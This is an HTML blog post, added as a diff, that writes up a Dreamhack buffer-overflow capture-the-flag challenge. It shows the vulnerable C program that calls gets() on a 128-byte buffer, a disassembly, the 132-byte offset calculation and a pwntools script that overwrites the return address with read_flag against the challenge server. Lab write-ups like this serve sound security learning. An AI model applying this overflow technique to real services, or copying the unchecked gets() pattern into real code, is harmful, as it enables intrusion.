@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf2 · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>ctf2</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<p><a href="https://en.wikipedia.org/wiki/Buffer_overflow"><strong>Buffer overflow</a> is one of the basics of pwnable 🐱</strong></p>
+
+<p><strong>The path of the flag file is <code>/home/bof/flag</code>.</strong></p>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack]
+└─$ cat basic_exploitation_001.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+void read_flag() {
+    system("cat flag");
+}
+
+int main(int argc, char *argv[]) {
+
+    char buf[0x80];
+
+    initialize();
+
+    gets(buf);
+
+    return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-powershell">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x080485cc &lt;+0&gt;:     push   ebp
+   0x080485cd &lt;+1&gt;:     mov    ebp,esp
+   0x080485cf &lt;+3&gt;:     add    esp,0xffffff80
+   0x080485d2 &lt;+6&gt;:     call   0x8048572 &lt;initialize&gt;
+   0x080485d7 &lt;+11&gt;:    lea    eax,[ebp-0x80]
+   0x080485da &lt;+14&gt;:    push   eax
+   0x080485db &lt;+15&gt;:    call   0x80483d0 &lt;gets@plt&gt;
+   0x080485e0 &lt;+20&gt;:    add    esp,0x4
+   0x080485e3 &lt;+23&gt;:    mov    eax,0x0
+   0x080485e8 &lt;+28&gt;:    leave
+   0x080485e9 &lt;+29&gt;:    ret
+End of assembler dump.
+</code></pre>
+
+<p>buf 의 크기 만큼 + read_flag(0x080485b9) 주소 를 <strong><code>ebp-0x80</code></strong> 에 넣으면 된다.</p>
+
+<p>0x80 = 16 x 8 = 128</p>
+
+<p>128 + ret (4) = 132</p>
+
+<p>따라서 A 를 132 개 만큼 채운 뒤 read_flag 주소를 담으면 된다.</p>
+
+<pre><code class="language-powershell">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack]
+└─$ cat exploit.py
+from pwn import *
+
+context.log_level = "info"
+context.arch = "i386"
+
+payload = b"A"*132 + p32(0x080485b9)
+
+io = remote("host3.dreamhack.games", 16833)
+
+io.recv(timeout=0.5)
+
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
